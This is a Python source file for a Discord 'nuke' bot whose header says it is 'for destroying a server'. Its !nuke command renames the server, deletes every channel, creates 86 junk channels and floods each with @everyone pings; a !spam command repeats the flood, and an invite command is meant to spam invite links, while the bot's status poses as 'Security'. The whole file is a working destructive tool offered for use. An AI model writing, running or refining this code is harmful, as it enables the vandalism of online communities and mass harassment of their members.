# Nukebot
#!nuke for destroying a server
#use it on your own risk


import discord
from discord.ext import commands, tasks
import os
import asyncio

prefix='!'#Prefix for the bot
n=0

intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)




client = commands.Bot(command_prefix=prefix, intents=intents)
@client.event
async def on_ready():
    print('Bot is online')# Message after you start it successfully
    await client.change_presence(activity=discord.Game('Security'))

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command
async def invite(ctx):
  await ctx.reply('') #Which server you want to spam invites to. Place invite link

@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='') #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('Bruuuuh') # Decide what should be the name of the text channels that you will create
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone ') # Put the messages you want to be spammed here
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')

@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send('@everyone ') #Put what to be spammed in the brackets 
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')

client.run('') #Put your bot token here
